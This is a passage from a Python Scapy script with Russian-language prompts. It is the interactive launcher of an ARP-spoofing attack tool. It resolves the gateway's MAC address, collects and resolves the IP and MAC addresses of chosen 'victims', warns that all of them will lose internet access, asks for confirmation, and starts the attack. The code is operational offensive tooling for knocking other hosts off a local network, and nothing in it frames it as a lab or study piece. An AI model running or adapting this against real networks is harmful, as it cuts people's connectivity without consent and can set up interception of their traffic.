        if not gateway_mac:
            print(f"\n\033[1;33m[*] Определяю MAC шлюза {gateway_ip}...\033[0m")
            for attempt in range(3):
                arp_req = ARP(pdst=gateway_ip)
                broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
                packet = broadcast / arp_req
                answered, _ = srp(packet, timeout=1, verbose=False, retry=2)
                if answered:
                    gateway_mac = answered[0][1].hwsrc
                    print(f"\033[1;32m[✓] MAC шлюза: {gateway_mac}\033[0m")
                    break
            else:
                gateway_mac = input(f"\033[1;34m[?] Введите MAC шлюза {gateway_ip}: \033[0m").strip()
            
            # Обновляем объект атаки
            attack.gateway_ip = gateway_ip
            attack.gateway_mac = gateway_mac
        
        # Ввод жертв
        print("\n\033[1;34m[?] Введите IP жертв (через пробел или запятую):\033[0m")
        victim_ips_input = input("   IP жертв: ").strip()
        
        # Разделяем ввод
        victim_ips = []
        for separator in [',', ' ', ';', '|']:
            if separator in victim_ips_input:
                victim_ips = [ip.strip() for ip in victim_ips_input.split(separator) if ip.strip()]
                break
        
        if not victim_ips:
            victim_ips = [victim_ips_input]
        
        # Получаем MAC адреса жертв
        for victim_ip in victim_ips:
            if victim_ip:
                print(f"\n\033[1;33m[*] Определяю MAC жертвы {victim_ip}...\033[0m")
                victim_mac = None
                for attempt in range(3):
                    arp_req = ARP(pdst=victim_ip)
                    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
                    packet = broadcast / arp_req
                    answered, _ = srp(packet, timeout=1, verbose=False, retry=2)
                    if answered:
                        victim_mac = answered[0][1].hwsrc
                        print(f"\033[1;32m[✓] MAC жертвы: {victim_mac}\033[0m")
                        break
                else:
                    victim_mac = input(f"\033[1;34m[?] Введите MAC жертвы {victim_ip}: \033[0m").strip()
                
                if victim_mac:
                    attack.add_victim(victim_ip, victim_mac)
    
    # Проверяем что все данные есть
    if not gateway_ip or not gateway_mac:
        print("\033[1;31m[!] Шлюз не указан. Выход.\033[0m")
        sys.exit(1)
    
    if attack.get_victim_count() == 0:
        print("\033[1;31m[!] Нет выбранных жертв. Выход.\033[0m")
        sys.exit(1)
    
    # Подтверждение
    print(f"""
\033[1;31m{'═'*60}\033[0m
\033[1;41m{' ВНИМАНИЕ: АТАКА НАЧНЕТСЯ '.center(60)}\033[0m
\033[1;31m{'═'*60}\033[0m

\033[1;33m🌐 Шлюз:\033[0m    \033[1;36m{gateway_ip}\033[0m (\033[1;35m{gateway_mac}\033[0m)
\033[1;33m🎯 Жертвы ({attack.get_victim_count()}):\033[0m""")
    
    for i, victim in enumerate(attack.victims, 1):
        print(f"      {i:2d}. \033[1;36m{victim['ip']}\033[0m (\033[1;35m{victim['mac']}\033[0m)")
    
    print(f"""
\033[1;33m📡 Интерфейс:\033[0m \033[1;36m{interface}\033[0m

\033[1;31m⚠  Все выбранные жертвы потеряют доступ к интернету!\033[0m
\033[1;32m✓  Нажмите \033[1;33mCtrl+C\033[1;32m для остановки и восстановления\033[0m
""")
    
    confirm = run_fzf(["✅ Да, начать атаку", "❌ Нет, отменить"], "🔥 Подтвердить запуск? →")
    if not confirm or "отменить" in confirm.lower():
        print("\033[1;33m[!] Атака отменена\033[0m")
        sys.exit(0)
    
    # Запуск атаки
    attack.start_attack()

if __name__ == "__main__":
    main()
